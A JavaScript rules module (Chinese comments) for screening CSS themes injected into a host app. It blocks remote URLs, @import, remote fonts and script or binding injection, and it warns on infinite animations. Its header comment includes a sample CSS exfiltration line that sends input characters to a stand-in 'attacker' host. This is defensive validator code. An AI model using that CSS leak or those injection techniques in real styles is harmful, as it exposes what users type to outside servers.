"use strict";
/**
 * 皮肤检查规则表。
 *
 * 这里的每一条都不是"最佳实践"抄来的，是在一台机器上真的踩出来的：
 *
 *  · remote-url —— 皮肤是被注入进页面的代码，而**纯 CSS 也能外泄数据**：
 *      input[value^="a"] { background: url(https://attacker/?a) }
 *    属性选择器逐字符命中、命中就发一个请求，输入框内容一个字母一个字母地送出去。
 *    所以规则不是"皮肤里别写 JS"，远程 URL 本身就是漏点。
 *
 *  · infinite-animation —— 一条铺满窗口的永不停 keyframes 动画，实测把宿主
 *    从 2.5% CPU 拉到 111%（Electron 里代价 = 动画面积 × 窗口像素数）。
 *    跑一次就结束的 transition 没问题，`infinite` 才是。
 *
 *  · hashed-class-selector —— 钩 `.pI_x6G_frame` 这种编译产物类名，宿主下次
 *    构建就换一个哈希，皮肤当场失效。稳定的钩子只有三种：CSS 变量、
 *    id 选择器（#app / #root）、语义属性（[role=dialog]）。
 */

/** 命中即拒绝套用。全部是"皮肤能读到/发出去它不该碰的东西"。 */
const SECURITY_RULES = [
  {
    id: "remote-url",
    severity: "error",
    pattern: /url\(\s*["']?\s*(?:https?:)?\/\//gi,
    message: "引用了远程 URL",
    why: "属性选择器 + 远程 url() 可以把输入框内容逐字符外泄；同时也是一个访问指纹。素材请随皮肤一起分发，用 __SKIN__/ 引用。",
  },
  {
    id: "remote-import",
    severity: "error",
    pattern: /@import\s+(?:url\(\s*)?["']?\s*(?:https?:)?\/\//gi,
    message: "远程 @import",
    why: "远程样式表的内容不在审查范围内，等于把皮肤的控制权交给一个你不管的服务器。",
  },
  {
    id: "remote-font",
    severity: "error",
    pattern: /@font-face[^}]*src\s*:[^;}]*url\(\s*["']?\s*(?:https?:)?\/\//gi,
    message: "远程字体",
    why: "字体请求会带上 Referer 和 UA，等于向第三方上报「这个人正在用这个应用」。字体文件请打包进皮肤。",
  },
  {
    id: "script-injection",
    severity: "error",
    pattern: /<script|javascript\s*:|expression\s*\(/gi,
    message: "脚本注入",
    why: "皮肤是样式，不是代码。需要行为请写宿主插件，那条路径有独立的审查。",
  },
  {
    id: "legacy-behavior",
    severity: "error",
    pattern: /-moz-binding\s*:|(?:^|[;{\s])behavior\s*:/gi,
    message: "旧式行为绑定",
    why: "-moz-binding / behavior 在老引擎里等价于执行脚本，是绕过「只准写 CSS」的经典手法。",
  },
];

/** 命中不拦，但会在界面上标出来 —— 这些是"能用但迟早出事"。 */
const QUALITY_RULES = [
  {
    id: "infinite-animation",
    severity: "warn",
    pattern: /animation(?:-iteration-count)?\s*:[^;}]*\binfinite\b/gi,
    message: "永不停止的动画",
    why: "实测一条全窗口的 infinite 动画把宿主从 2.5% CPU 拉到 111%，界面卡到没法用。跑一次就结束的 transition 不受影响。",
  },
  {
    id: "attribute-value-selector",
    severity: "warn",
    pattern: /\[\s*(?:value|placeholder|title|alt|aria-label|href|src)\s*[\^$*|~]?=/gi,
    message: "按属性值取元素",
    why: "本身无害，但它和远程 URL 组合就是外泄输入内容的那把钥匙。仓库会盯着这个组合。",
  },
];

/** 稳定钩子：宿主升级后还认得的选择器。缺了它们皮肤多半是"钩在流沙上"。 */
const REQUIRED_VARIABLES = ["--color-bg", "--color-text", "--color-accent"];

/**
 * 编译产物类名的识别。正则一把梭做不到 —— `.pI_x6G_frame` 的哈希在**中间**，
 * 而 BEM 的 `.block__element` 长得很像却完全是手写的。所以拆成"取出类名"
 * 加"逐个判断"两步，判断写成可读的谓词，误判时一眼看得出是哪一条放宽了。
 */
const CLASS_TOKEN = /\.(-?[_a-zA-Z][\w-]*)/g;

function looksHashedClass(name) {
  // A `Comp_x6G_frame` —— 下划线分段里夹着一段"既有字母又有数字"的短串。
  //   `block__element`（无数字）、`h_100`（无字母）都不会命中。
  const parts = name.split("_");
  if (parts.length > 1 &&
      parts.slice(1).some((p) => p.length >= 3 && /[0-9]/.test(p) && /[a-zA-Z]/.test(p))) {
    return true;
  }
  // B `.a3Bf9Q` —— 六位以上的裸哈希，同时含大写、小写和数字。
  //   Tailwind 的 `.text-2xl` 没有大写，不会命中。
  return name.length >= 6 && /[a-z]/.test(name) && /[A-Z]/.test(name) && /[0-9]/.test(name);
}

module.exports = {
  SECURITY_RULES,
  QUALITY_RULES,
  REQUIRED_VARIABLES,
  CLASS_TOKEN,
  looksHashedClass,
};
